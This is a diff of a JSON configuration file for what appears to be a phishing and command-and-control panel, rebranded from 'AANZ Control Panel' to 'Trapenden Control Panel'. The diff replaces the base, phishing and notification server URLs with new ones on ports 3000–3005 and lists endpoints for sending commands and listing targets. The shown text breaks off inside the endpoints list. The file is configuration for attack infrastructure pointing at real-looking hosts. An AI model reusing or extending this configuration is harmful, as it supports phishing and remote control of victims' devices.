@@ -1,9 +1,9 @@
 {
-  "base_url": "http://xii.aanzload.my.id:2000",
-  "phishing_url": "http://xii.aanzload.my.id:2001",
-  "base_notif": "http://xii.aanzload.my.id:2002",
-  "version": "1.0.0",
-  "app_name": "AANZ Control Panel",
+  "base_url": "http://trapenden.miunnst.site:3000",
+  "phishing_url": "http://trapenden.miunnst.site:3005",
+  "base_notif": "http://trapenden.miunnst.site:3003",
+  "version": "11.0.0",
+  "app_name": "Trapenden Control Panel",
   "endpoints": {
     "send_command": "/api/send-command",
     "list_targets": "/api/list-targets",
